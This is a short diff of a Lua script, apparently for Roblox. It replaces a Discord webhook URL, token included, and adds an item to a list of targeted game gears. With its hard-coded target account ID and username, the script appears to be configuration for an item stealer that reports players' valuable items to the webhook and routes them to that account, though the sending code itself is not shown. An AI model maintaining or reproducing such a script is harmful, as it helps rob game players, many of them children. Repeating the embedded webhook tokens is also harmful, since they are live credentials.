@@ -1,6 +1,6 @@
 local TARGET_ID = 7662791126
 local TARGET_USER = "Realrichmariii"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1572904770471993360/X-_dcRU14KhgyboN-vw9oshuFCzVh_RqQRL3SoghMisve6Qi8QLrO3Crye2hBc0eWEXm"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1572911567626838028/sHoUP8E_4V6jd-5MW1wXrHRTQrieu0yP84WuyzSu6TKJjoiRc4V6swMflIuraN1_-T4q"
 
 local TargetBrainrots = {
     ["Strawberry Elephant"] = true,
@@ -161,7 +161,8 @@ local TargetGears = {
     ["Yin Yang Lamp"] = true,
     ["Yin Yang Slap"] = true,
     ["Phantom Slap"] = true,
-    ["Crystal Slap"] = true
+    ["Crystal Slap"] = true,
+    ["Skeleton Dragon"] = true
 }
 
 task.spawn(function()
